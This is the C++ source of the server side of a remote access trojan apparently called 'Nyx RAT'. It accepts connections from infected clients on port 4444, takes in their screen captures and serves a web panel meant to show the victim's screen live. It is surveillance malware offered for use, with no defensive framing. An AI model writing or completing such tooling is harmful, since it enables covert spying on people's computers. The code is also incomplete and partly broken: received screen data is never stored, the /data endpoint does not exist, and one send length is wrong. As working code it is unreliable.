// server.cpp
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <thread>
#pragma comment(lib, "ws2_32.lib")

const int PORT = 5000;  // HTTP port
const int CLIENT_PORT = 4444;

std::string html = R"(
<!DOCTYPE html>
<html><head><title>Nyx RAT</title>
<style>body{background:#000;color:#0f0;font-family:monospace;}</style>
</head><body>
<h1>Nyx RAT Live</h1>
<div id="s"></div>
<script>
setInterval(()=>{fetch('/data').then(r=>r.text()).then(d=>{document.getElementById('s').innerHTML = '<img src="data:image/jpeg;base64,'+d+'">';});}, 600);
</script>
</body></html>
)";

void HandleClient(SOCKET client) {
    // Receive screen and serve via HTTP
    while (true) {
        int len;
        recv(client, (char*)&len, 4, 0);
        std::vector<char> buf(len);
        recv(client, buf.data(), len, 0);
        
        // Save or serve base64
        // Simple: write to file or memory
    }
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    
    // HTTP Server
    SOCKET http = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{ AF_INET, htons(PORT), INADDR_ANY };
    bind(http, (sockaddr*)&addr, sizeof(addr));
    listen(http, 10);
    
    std::thread([](){
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in a{ AF_INET, htons(CLIENT_PORT), INADDR_ANY };
        bind(s, (sockaddr*)&a, sizeof(a));
        listen(s, 5);
        while (true) {
            SOCKET c = accept(s, NULL, NULL);
            std::thread(HandleClient, c).detach();
        }
    }).detach();
    
    MessageBoxA(0, "Nyx Server running on port 5000\nOpen http://127.0.0.1:5000", "Nyx", 0);
    
    while (true) {
        SOCKET conn = accept(http, NULL, NULL);
        send(conn, ("HTTP/1.1 200 OK\r\nContent-Length: " + std::to_string(html.size()) + "\r\n\r\n" + html).c_str(), html.size() + 100, 0);
        closesocket(conn);
    }
    
    WSACleanup();
    return 0;
}